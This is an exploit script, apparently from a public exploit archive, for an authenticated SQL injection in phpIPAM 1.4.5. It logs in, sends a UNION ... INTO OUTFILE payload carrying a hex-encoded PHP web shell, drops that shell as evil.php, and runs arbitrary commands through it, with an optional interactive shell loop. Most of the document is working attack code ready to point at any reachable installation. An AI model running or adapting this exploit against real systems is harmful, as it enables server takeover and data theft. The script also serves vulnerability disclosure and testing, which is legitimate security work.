# Exploit Title: phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)
# Date: 2022-04-10
# Exploit Author: Guilherme '@behiNdyk1' Alves
# Vendor Homepage: https://phpipam.net/
# Software Link: https://github.com/phpipam/phpipam/releases/tag/v1.4.5
# Version: 1.4.5
# Tested on: Linux Ubuntu 20.04.3 LTS

#!/usr/bin/env python3

import requests
import argparse
from sys import exit, argv
from termcolor import colored

banner = """
█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄\n"""
print(banner)

parser = argparse.ArgumentParser(usage="./exploit.py -url http://domain.tld/ipam_base_url -usr username -pwd password -cmd 'command_to_execute' --path /system/writable/path/to/save/shell", description="phpIPAM 1.4.5 - (Authenticated) SQL Injection to RCE")

parser.add_argument("-url", type=str, help="URL to vulnerable IPAM", required=True)
parser.add_argument("-usr", type=str, help="Username to log in as", required=True)
parser.add_argument("-pwd", type=str, help="User's password", required=True)
parser.add_argument("-cmd", type=str, help="Command to execute", default="id")
parser.add_argument("--path", type=str, help="Path to writable system folder and accessible via webserver (default: /var/www/html)", default="/var/www/html")
parser.add_argument("--shell", type=str, help="Spawn a shell (non-interactive)", nargs="?")
args = parser.parse_args()

url = args.url
username = args.usr
password = args.pwd
command = args.cmd
path = args.path

# Validating url
if url.endswith("/"):
	url = url[:-1]
if not url.startswith("http://") and not url.startswith("https://"):
	print(colored("[!] Please specify a valid scheme (http:// or https://) before the domain.", "yellow"))
	exit()

def login(url, username, password):
	"""Takes an username and a password and tries to execute a login (IPAM)"""
	data = {
	"ipamusername": username,
	"ipampassword": password
	}
	print(colored(f"[...] Trying to log in as {username}", "blue"))
	r = requests.post(f"{url}/app/login/login_check.php", data=data)
	if "Invalid username or password" in r.text:
		print(colored(f"[-] There's an error when trying to log in using these credentials --> {username}:{password}", "red"))
		exit()
	else:
		print(colored("[+] Login successful!", "green"))
		return str(r.cookies['phpipam'])

auth_cookie = login(url, username, password)

def exploit(url, auth_cookie, path, command):
	print(colored("[...] Exploiting", "blue"))
	vulnerable_path = "app/admin/routing/edit-bgp-mapping-search.php"
	data = {
	"subnet": f"\" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '{path}/evil.php' -- -",
	"bgp_id": "1"
	}
	cookies = {
	"phpipam": auth_cookie
	}
	requests.post(f"{url}/{vulnerable_path}", data=data, cookies=cookies)
	test = requests.get(f"{url}/evil.php")
	if test.status_code != 200:
		return print(colored(f"[-] Something went wrong. Maybe the path isn't writable. You can still abuse of the SQL injection vulnerability at {url}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1", "red"))
	if "--shell" in argv:
		while True:
			command = input("Shell> ")
			r = requests.get(f"{url}/evil.php?cmd={command}")
			print(r.text)
	else:
		print(colored(f"[+] Success! The shell is located at {url}/evil.php. Parameter: cmd", "green"))
		r = requests.get(f"{url}/evil.php?cmd={command}")
		print(f"\n\n[+] Output:\n{r.text}")

exploit(url, auth_cookie, path, command)